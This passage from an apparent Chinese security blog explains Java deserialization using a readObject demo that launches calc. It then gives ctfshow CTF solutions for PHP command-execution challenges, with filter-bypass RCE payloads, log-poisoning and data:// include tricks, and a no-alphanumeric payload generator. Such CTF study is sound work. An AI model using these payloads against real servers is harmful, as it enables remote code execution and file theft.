TC_PROXYCLASSDESC:\n                    if (type == String.class) {\n                        throw new ClassCastException(\"Cannot cast a class to java.lang.String\");\n                    }\n                    return readClassDesc(unshared);\n\n                case TC_STRING:\n                case TC_LONGSTRING:\n                    return checkResolve(readString(unshared));\n\n                case TC_ARRAY:\n                    if (type == String.class) {\n                        throw new ClassCastException(\"Cannot cast an array to java.lang.String\");\n                    }\n                    return checkResolve(readArray(unshared));\n\n                case TC_ENUM:\n                    if (type == String.class) {\n                        throw new ClassCastException(\"Cannot cast an enum to java.lang.String\");\n                    }\n                    return checkResolve(readEnum(unshared));\n\n                case TC_OBJECT:\n                    if (type == String.class) {\n                        throw new ClassCastException(\"Cannot cast an object to java.lang.String\");\n                    }\n                    return checkResolve(readOrdinaryObject(unshared));\n\n                case TC_EXCEPTION:\n                    if (type == String.class) {\n                        throw new ClassCastException(\"Cannot cast an exception to java.lang.String\");\n                    }\n                    IOException ex = readFatalException();\n                    throw new WriteAbortedException(\"writing aborted\", ex);\n\n                case TC_BLOCKDATA:\n                case TC_BLOCKDATALONG:\n                    if (oldMode) {\n                        bin.setBlockDataMode(true);\n                        bin.peek();             // force header read\n                        throw new OptionalDataException(\n                            bin.currentBlockRemaining());\n                    } else {\n                        throw new StreamCorruptedException(\n                            \"unexpected block data\");\n                    }\n\n                case TC_ENDBLOCKDATA:\n                    if (oldMode) {\n                        throw new OptionalDataException(true);\n                    } else {\n                        throw new StreamCorruptedException(\n                            \"unexpected end of block data\");\n                    }\n\n                default:\n                    throw new StreamCorruptedException(\n                        String.format(\"invalid type code: %02X\", tc));\n            }\n        } finally {\n            depth--;\n            bin.setBlockDataMode(oldMode);\n        }\n    }\n```\n\n这个过程基本是跟 writeObject 差不多，我就不过多赘述了，只是介绍一个具体的思路以及分析源码的原理\n\n### 一个小tip\n\n之前在学习php反序列化的时候，我们都知道php反序列化使用的是serialize()序列化函数和unserialize()反序列化函数，那么我们也需要注意到，当类中存在`__sleep()`方法的时候，在我们序列化对象的时候就会触发该方法，当类中存在`__wakeup()`方法的时候，我们反序列化对象就会触发该方法。\n\njava也是同理，readObject()就相当于php中的`__wakeup()`方法，而writeObject()就相当于`__sleep()`方法，其实这两个方法是默认可以不写的，但是我们可以通过重写这两种方法，通过自定义的`writeObject()`和`readObject()`方法可以允许用户控制序列化和反序列化的过程，比如可以在序列化的过程中动态改变序列化的数值。\n\n这个是我们反序列化攻击的重要思路，下面会详细介绍\n\n## Serializable 接口\n\nSerializable 是java提供的**标记接口**，位于java.io包中，但是这个接口并没有任何内容(没有定义任何方法)，它只是作为一个序列化能力的标识，意味着任何实现该接口的对象都可以实现序列化和反序列化的操作。\n\n只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） \n\nSerializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。如果我们删掉这个接口会是什么样的呢？\n\n![image-20250526113054640](../image/achieve/202411/java学习/image-20250526113054640.png)\n\n另外我们需要注意的几个地方\n\n- 在反序列化的过程中，如果该类的父类没有实现序列化接口，那么就需要提供无参构造函数来重新创建对象\n- 一个实现序列化接口的子类是可以被序列化的\n- 静态成员变量不能被序列化（因为序列化是针对对象属性的，而静态成员变量是属于类本身的）\n- transient标识的对象成员变量不参与序列化\n\n![image-20250526115317085](../image/achieve/202411/java学习/image-20250526115317085.png)\n\n这里可以看到，即使我们利用构造函数给test变量进行了赋值，但是在序列化并且反序列化的输出后发现该变量的值是null，意味着这个变量并没有参与序列化和反序列化的操作\n\n## Java反射\n\n参考文章：\n\nhttps://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html\n\nhttps://pdai.tech/md/java/basic/java-basic-x-reflection.html\n\n在学习Java反射之前，先看看官方对反射的介绍\n\nJAVA反射机制是在程序运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。\n\nJava 反射（Reflection）是一个强大的特性，它允许程序在运行时查询、访问和修改类、接口、字段和方法的信息。反射提供了一种动态地操作类的能力，这在很多框架和库中被广泛使用\n\n在学习反射之前，我发现很多文章都会从一个很巧妙的角度去进行解释，那就是从正射出发引导反射的概念和利用\n\n什么是正射呢？\n\n很简单，就是我们对类的实例化的过程就是正射\n\n```java\nPeople people = new People();\n```\n\n此时我们是知道这个类的信息例如成员变量成员方法，这个类是用来干嘛的，那么我们就可以进行实例化一个对象也就是正射\n\n那如果我们并不知道类的相关信息呢？\n\n所以此时就引出了反射的作用，反射就是当我们不知道我们实例化的对象是什么的时候，我们利用反射技术可以对一个类进行解剖，把个个组成部分映射成一个个对象。讲的官方一点：Java反射（Reflection）是一种在**运行时**动态分析或修改类、对象、方法和属性的机制。它允许程序在不需要提前知道类具体结构的情况下，通过名称或对象实例来操作其内部成员。\n\nJava的反射提供了一系列的类和接口来操作class对象，主要的类包括\n\n- **`java.lang.Class`**：表示类的对象。提供了方法来获取类的字段、方法、构造函数等。\n- **`java.lang.reflect.Field`**：表示类的字段（属性）。提供了访问和修改字段的能力。\n- **`java.lang.reflect.Method`**：表示类的方法。提供了调用方法的能力。\n- **`java.lang.reflect.Constructor`**：表示类的构造函数。提供了创建对象的能力。\n\n### Class类\n\n每个java类运行时都在JVM里表现为一个class对象，对每一种对象，JVM 都会实例化一个 java.lang.Class 的实例，java.lang.Class 为我们提供了在运行时访问对象的属性和类型信息的能力\n\nClass类一般来说是用来获取类对象的，获取类对象的方法有三种\n\n- 根据类名：类名.class\n- 根据对象：对象.getClass()\n- 根据全限定类名：Class.forName(全限定类名)\n\n在Java中，通过反射获取Class类对象以及类中的成员变量，方法和构造方法的话，我们需要用到Class类以及java.lang.reflect类库一起实行反射技术在反射包中，我们常用的类主要有Constructor类表示的是Class 对象所表示的类的构造方法，利用它可以在运行时动态创建对象、Field表示Class对象所表示的类的成员变量，通过它可以在运行时动态修改成员变量的属性值(包含private)、Method表示Class对象所表示的类的成员方法，通过它可以动态调用对象的方法(包含private)\n\n接下来我们看看如何通过反射操作类\n\n### 通过反射实例化对象\n\n- **Class::forName()方法**\n\n```java\nprivate static Class<?> forName(String className, Class<?> caller)\n```\n\n这个方法用于根据类名加载类，参数是要加载的类的全限定名（包括包名），而返回类型是加载的类对象Class\n\n- **Class::getClass 方法**\n\ngetClass 方法是一个无参函数\n\n因为每个对象运行时都会存在一个Class实例，所以如果我们已经拿到了一个对象，可以很方便地使用它的 *getClass* 方法获得一个 Class \n\n- **Class::getConstructor()/Class::getConstructors()方法**\n\n```java\npublic Constructor<T> getConstructor(Class<?>... parameterTypes)\npublic Constructor<?>[] getConstructors()\n```\n\n这个方法用来获取类的所有公共构造函数，并返回一个`Constructor<?>` 数组,但是需要注意的是这里的参数是class类型的参数，例如我们的有参构造函数的参数是String类型的参数，那么我们在获取的时候就需要传入String.class类型的参数\n\n- **Class::getDeclaredConstructor()/Class::getDeclaredConstructors()方法**\n\n```java\npublic Constructor<T> getDeclaredConstructor(Class<?>... parameterTypes)\npublic Constructor<?>[] getDeclaredConstructors()\n```\n\n其实和上面不同的是，这里能获取所有类型的构造函数\n\n[一个师傅](https://blog.csdn.net/u011240877/article/details/54604146)的图片\n\n![shixinzhang](../image/achieve/202411/java学习/SouthEast-1748334976868-4.jpeg)\n\n但是一般在获取类构造方法之前，我们需要先获取到类变量，下面我们会讲到\n\n### 通过反射操作类变量\n\n首先就是获取类变量\n\n- **Class::getFields()方法/Class::getField()方法**\n\n```java\npublic Field getField(String name)\npublic Field[] getFields()\n```\n\n返回一个包含某些Field对象的数组/单个Field对象，这些对象反映此Class对象所表示的类或接口的所有可访问公共字段。\n\n- **Class::getDeclaredFields()/Class::getDeclaredField方法**\n\n```java\npublic Field getDeclaredField(String name)\npublic Field[] getDeclaredFields()\n```\n\n返回 Field 对象的一个数组/单个Field对象，这些对象反映此 Class 对象所表示的类或接口所声明的所有字段。包括公共、保护、默认（包）访问和私有字段，但不包括继承的字段。\n\n继续放大师傅的图片讲的很简单明了\n\n![shixinzhang](../image/achieve/202411/java学习/SouthEast.jpeg)\n\n然后就是对类变量的操作\n\n- **Field::set()方法**\n\n其实这个本质上不是Class类中的方法，而是一些Field类的方法，这个方法主要是用来改变属性的值\n\n```java\npublic void set(Object obj,Object value)\n```\n\n这里需要传入一个对象和修改的值，并没有返回值\n\n- **Field::get()方法**\n\n这个方法主要是用来获取属性的值的\n\n```java\npublic void get(Object obj)\n```\n\n- **Field::setAccessible()方法**\n\n和getDeclaredFields()方法一样，这里的话相对于set方法来说权限更大，一般来说private属性的值是不可以被修改的，但是通过这个方法可以允许我们对私有属性设置操作权限\n\n```java\npublic void setAccessible(boolean flag)\n```\n\n例如我们类中age是一个private类型的成员变量\n\n```java\nagefield.setAccessible(true);\nagefield.set(p, 30);\nSystem.out.println(p);\n```\n\n我们写个demo试一下\n\n```java\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class ReflectionTest {\n    public static void main(String[] args) throws Exception {\n        Class c = Class.forName(\"People\");\n        Constructor ctor = c.getDeclaredConstructor(String.class, int.class);\n        People p = (People) ctor.newInstance(\"wang\",30);\n        System.out.println(p);\n\n        //获取类的成员变量\n\n        //1.通过getFeild获取单个成员变量\n        //只能获取公共属性的成员变量\n        //Field nameField = c.getField(\"name\");\n\n        //2.通过getFeilds获取所有公共属性的变量数组\n        //Field[] fields = c.Fields();\n\n        //3.通过getDeclaredField获取单个属性对象\n        //无论是private还是public的属性都能获得\n        Field nameField = c.getDeclaredField(\"name\");\n        Field ageField = c.getDeclaredField(\"age\");\n\n        //4.通过getDeclaredFields获取所有属性的变量数组\n        //Field[] fields = c.getDeclaredFields();\n\n        //操作类的成员变量\n        //公共类型可以直接操作\n        nameField.set(p,\"meng\");\n        ageField.setAccessible(true);\n        ageField.set(p,20);\n        System.out.println(p);\n    }\n}\n\n```\n\n### 通过反射操作类方法\n\n首先就是获取类方法\n\n- **getDeclaredMethod\\getDeclaredMethods()**方法\n\n```\npublic Method getDeclaredMethod(String name,Class<?>... parameterTypes)\npublic Method[] getDeclaredMethods()\n```\n\n返回一个 Method 对象/Method 对象的一个数组，该对象反映此 Class 对象所表示的类或接口的指定已声明方法。name 参数是一个 String，它是方法的名称，parameterTypes 参数是 Class 对象的一个数组，它按声明顺序标识该方法的形参类型。前者是获取单个成员方法，后者是获取一个成员方法数组`Method[]`\n\n- **getMethod\\getMethods()**方法\n\n```\nMethod[] getMethods()\nMethod getMethod(String name, Class<?>... parameterTypes)\n```\n\n返回一个 Method 对象/Method对象数组，它反映此 Class 对象所表示的类或接口的指定**公共成员方法**。前者是获取单个成员方法，后者是获取一个成员方法数组`Method[]`\n\n然后就是操作类，调用Method的invoke方法\n\n- **Method::invoke()方法**\n\n```java\npublic Object invoke(Object obj,Object... args)\n```\n\nobj--实例对象 ...args--用于方法调用的实参\n\n对带有指定参数的指定对象调用由此 Method 对象表示的底层方法。\n\n- **Method::setAccessible()方法**\n\n```java\npublic void setAccessible(boolean flag)\n```\n\n接下来我们写个demo\n\n- 操作void返回值的方法\n\n```java\n    public void getName(String name) {\n        System.out.println(\"name's = \" + name);\n    }\n```\n\n然后我们调用该方法\n\n```java\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class ReflectionTest {\n    public static void main(String[] args) throws Exception {\n        Class c = Class.forName(\"People\");\n        Constructor ctor = c.getDeclaredConstructor(String.class, int.class);\n        People p = (People) ctor.newInstance(\"wang\",30);\n        //System.out.println(p);\n\n        //获取类的成员方法\n        Method m = c.getDeclaredMethod(\"getName\",String.class);\n\n        m.invoke(p, \"wang\");\n    }\n}\n//name's = wang\n```\n\n- 操作有返回值的方法\n\n```java\n    public String getName(String name) {\n        return name;\n    }\n```\n\n然后我们调用该方法\n\n```java\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class ReflectionTest {\n    public static void main(String[] args) throws Exception {\n        Class c = Class.forName(\"People\");\n        Constructor ctor = c.getDeclaredConstructor(String.class, int.class);\n        People p = (People) ctor.newInstance(\"meng\",30);\n        //System.out.println(p);\n\n        //获取类的成员方法\n        Method m = c.getDeclaredMethod(\"getName\",String.class);\n\n        String name = (String) m.invoke(p, \"wang\");\n        System.out.println(name);\n        System.out.println(p);\n    }\n}\n\n```\n\n其实没啥区别，有返回值的话就需要一个变量去接收这个返回值，但是注意这里需要强制类型转化\n\n## 反序列化漏洞的成因\n\n我们先回忆一下在php反序列化中的漏洞成因是什么，其实就是在反序列化的时候由于我们反序列化函数接收的字符串是可控的，我们通过构造字符串导致在反序列化的时候自动触发一系列的方法最终导致达到我们想要的攻击效果例如读取文件，写木马等\n\n然后我们回到java反序列化，其实跟readObject有关系，因为这个方法可以经过开发者去重写\n\n  **只要服务器能反序列化数据，我们传入类的readObject中的代码就会自动执行**从而达到一个攻击的效果\n\n## 漏洞利用思路\n\n经过上面的研究，我们不难想到，在构造链子的时候，readObject方法可以像PHP中的`__destruct()`或者`__wakeup()`方法一样会在反序列化操作的时候自动调用，所以也就作为链子的入口了\n\n利用思路\n\n- 入口类的readObject方法直接执行危险代码调用危险方法\n- 入口类包裹其他类，即参数中包含其他可控的类，然后该类有危险的方法，通过readObject调用\n- 类包裹类，层层包裹，不过也是在readObject调用\n- 通过类加载机制构造函数/静态代码，等类加载的时候隐式执行代码\n\n我们挨个解释一下\n\n### 思路一\n\n前面其实也讲过，readObject方法是可以重构的，并且在反序列化的时候会自动调用，所以我们直接在readObject方法中构造危险代码，从而调用危险方法\n\n写个demo\n\n```java\nimport java.io.*;\n\n//定义一个可序列化的类\npublic class People implements Serializable {\n\n    //成员属性\n    public String name;\n    public int age;\n\n    //有参构造函数\n    public People(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    @Override\n    public String toString() {\n        return \"People{\"\n                + \"name = \" + name + \",\\t\"\n                + \"age = \" + age + \"}\";\n    }\n\n    //重写readObject方法\n    private void readObject(java.io.ObjectInputStream ois ) throws IOException, ClassNotFoundException {\n\n        //先执行默认的writeObject()方法\n        ois.defaultReadObject();\n\n        //重构方法\n        Runtime.getRuntime().exec(\"calc\");\n    }\n}\n```\n\n序列化并反序列化后发现这里先默认执行原先的readObject方法，然后再执行calc系统命令也就是启动计算器，然后我们分步调试看看过程\n\n![image-20250526151525675](../image/achieve/202411/java学习/image-20250526151525675.png)\n\n步入readObject方法\n\n![image-20250526151604915](../image/achieve/202411/java学习/image-20250526151604915.png)\n\n发现原生类的readObject方法并没有被调用，而是调用了用户重构的readObject方法，所以此时会执行27行和30行代码，也就会执行calc命令\n\n从上面的例子可以看出，在执行unserialize反序列化操作后，readObject方法会被调用，并且如果readObject被用户重构则会调用新的readObject方法，所以我们可以利用这个思路进行一个任意代码执行\n\n但是这种情况基本上不可能出现，除非开发者真的很粗心大意！\n\n### 思路二\n\n这里的话其实\n\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"ctfshow入门命令执行","url":"/2025/06/29/ctfshow入门命令执行/","content":"\n## web29\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 00:26:48\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n先看看目录\n\n```php\n?c=system(\"ls\");\n```\n\n是在当前目录下，那就直接读就行\n\n可以绕过也可以用通配符匹配\n\n```php\n通配符\n?c=system(\"tac fla?.php\");\n绕过\n?c=system(\"tac fla''g.php\");\n```\n\n绕过方法还是很多的，可以参考我的文章https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E9%BB%91%E5%90%8D%E5%8D%95\n\n## web30\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 00:42:26\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n这里过滤了system，用passthru绕过\n\n```php\n?c=passthru(\"ls\");\n?c=passthru(\"tac fla*\");\n```\n\n## web31\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 00:49:10\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n多过滤了cat，sort，shell，点号，单引号和空格\n\n绕过空格的话很多URL编码都可以绕，或者用Linux里面环境变量IFS\n\n```php\n?c=passthru(\"tac\\$IFS\\$1fla*\");\n?c=passthru(\"tac\\${IFS}fla*\");\n```\n\n这里需要注意将$进行转义，因为是在PHP环境下的\n\n## web32\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 00:56:31\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n多过滤了反引号，echo，分号，左括号\n\n分号的话可以直接用`?>`代替，因为在php中`?>`前最后的一行代码可以不用分号结尾\n\ninclude直接打伪协议\n\n```php\n?c=include$_GET[1]?>&1=data://text/plain,<?php+phpinfo();?>\n```\n\ninclude打日志包含\n\n```php\n?c=include$_GET[1]?>&1=../../../var/log/nginx/access.log\n```\n\n然后在UA头写马就行了\n\n## web33\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 02:22:27\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n//\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n这次把双引号也过滤了，但是不影响我们打include\n\n## web34\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 04:21:29\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n多过滤了冒号，但是不影响我们include，毕竟冒号是在另一个参数中使用的\n\n## web35\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 04:21:23\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\<|\\=/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n多过滤了`<`和`=`\n\n不过好像还是不影响我们include\n\n## web36\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 04:21:16\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\<|\\=|\\/|[0-9]/i\", $c)){\n        eval($c);\n    }\n    \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n多过滤了数字，那我们把GET参数换成字母就行了\n\n## web37\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 05:18:55\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\n//flag in flag.php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n这次直接换成include了，那就很多打法了，可以直接伪协议读文件，但是发现伪协议不能和通配符一起用，因为通配符是用在shell中的\n\n```php\n?c=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==\n```\n\n当然也可以日志包含\n\n## web38\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 05:23:36\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\n//flag in flag.php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag|php|file/i\", $c)){\n        include($c);\n        echo $flag;\n    \n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n过滤php,file,使用短标签或者base64编码绕过，所以上面的payload是可以用的\n\n## web39\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 06:13:21\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\n//flag in flag.php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        include($c.\".php\");\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n有后缀名限制的php代码，但是因为这里是直接拼接我们的输入，那我们用data协议的话是可以打的\n\n```php\n?c=data://text/plain,<?php phpinfo();?>\n```\n\n这里的话因为我们后面用`?>`进行闭合了，所以后面的php只会当成是代码外的一部分，当然也可以直接注释掉\n\n```php\n?c=data://text/plain,<?php phpinfo();%23\n```\n\n记得这里需要对`#`进行编码，不然会被当成是URL的一部分\n\n## web40\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-04 00:12:34\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-04 06:03:36\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n*/\n\n\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\<|\\.|\\>|\\/|\\?|\\\\\\\\/i\", $c)){\n        eval($c);\n    }\n        \n}else{\n    highlight_file(__FILE__);\n}\n```\n\n过滤了好多，先写个脚本筛选一下没过滤的字符\n\n```php\n<?php\nfor ($i=32;$i<127;$i++){\n        if (!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\<|\\.|\\>|\\/|\\?|\\\\\\\\/i\", chr($i))){\n            echo chr($i).\" \";\n        }\n}\n//  ! ( ) ; A B C D E F G H I J K L M N O P Q R S T U V W X Y Z _ a b c d e f g h i j k l m n o p q r s t u v w x y z |\n```\n\n题目的提示很明显了，就是让我们打无数字RCE，也就是无参数RCE\n\n```php\n?c=var_dump(scandir(pos(localeconv())));\n?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n```\n\n## web41\n\n### #无数字字母RCE\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: 羽\n# @Date:   2020-09-05 20:31:22\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 22:40:07\n# @email: 1341963450@qq.com\n# @link: https://ctf.show\n\n*/\n\nif(isset($_POST['c'])){\n    $c = $_POST['c'];\nif(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i', $c)){\n        eval(\"echo($c);\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n可用字符\n\n```php\n  ! \" # % ' ( ) * , . / : ; < = > ? @ \\ _ ` | \n```\n\n明显就是无数字字母RCE了，这里过滤了`+`，`~`，`^`，但是或运算符没被过滤，可以试一下\n\n```php\nc=(\"%10%08%10%09%0e%06%0f\"|\"%60%60%60%60%60%60%60\")//phpinfo\n```\n\n成功输出phpinfo，这里有echo，需要加个括号\n\n```php\nc=(\"%10%08%10%09%0e%06%0f\"|\"%60%60%60%60%60%60%60\")()//等价于(phpinfo)()\n```\n\n放个构造payload的脚本\n\n```python\nimport re\nimport urllib\nfrom urllib import parse\nhex_i = \"\"\nhex_j = \"\"\npattern='/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\nstr1=[\"system\",\"ls\"]#要构造的字符串 system 和 ls\nfor p in range(2):\n    t1 = \"\"\n    t2 = \"\"\n    for k in str1[p]:\n        for i in range(256):\n            for j in range(256):\n                if re.search(pattern,chr(i)) :\n                    break\n                if re.search(pattern,chr(j)) :\n                    continue\n                if i < 16:\n                    hex_i = \"0\" + hex(i)[2:]\n                else:\n                    hex_i=hex(i)[2:]\n                if j < 16:\n                    hex_j=\"0\"+hex(j)[2:]\n                else:\n                    hex_j=hex(j)[2:]\n                hex_i='%'+hex_i\n                hex_j='%'+hex_j\n                c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))\n                if(c ==k):\n                    t1=t1+hex_i\n                    t2=t2+hex_j\n                    break\n            else:\n                continue\n            break\n    print(\"(\\\"\"+t1+\"\\\"|\\\"\"+t2+\"\\\")\")\n```\n\n但是貌似这里禁用了system函数，我们换成passthru函数试一下\n\n```php\nc=(\"%10%01%13%13%14%08%12%15\"|\"%60%60%60%60%60%60%60%60\")(\"%00%0c%13%00\"|\"%27%60%60%27\")\n```\n\n发现成功执行并回显，那就用这个打就行了\n\n```php\nc=(\"%10%01%13%13%14%08%12%15\"|\"%60%60%60%60%60%60%60%60\")(\"%14%01%03%00%06%0c%01%07%00%10%08%10\"|\"%60%60%60%20%60%60%60%60%2e%60%60%60\")\n//(passthru)(tac flag.php)\n```\n\n如果括号中不是php的函数的话就会被当成正常的字符串\n\n```php\n<?php\n$c = \"(whoami)\";\neval(\"echo($c);\");\n//whoami\n```\n\n## web42\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 20:51:55\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    system($c.\" >/dev/null 2>&1\");\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n直接拼接的，system中可以执行多个命令，这里`>/dev/null`会将命令的输出丢弃，而`2>&1`是将命令的标注错误进行丢弃\n\n```php\n?c=ls;ls\n```\n\n这里的话后面的命令会被丢弃而前面的正常执行\n\n## web43\n\n```php\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-05 20:49:30\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-05 21:32:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    if(!preg_match(\"/\\;|cat/i\", $c)){\n        system($c.\" >/dev/null 2>&1\");\n    }\n}else{\n    highlight_file(__FILE__);\n}\n```\n\n过滤了分号和cat，但是可以用Linux命令连接符\n\n### Linux命令连接符&&\n\n```php\nroot@VM-16-12-ubuntu:/# cd /v && ls\nbash: cd: /v: No such file or directory\nroot@VM-16-12-ubuntu:/# 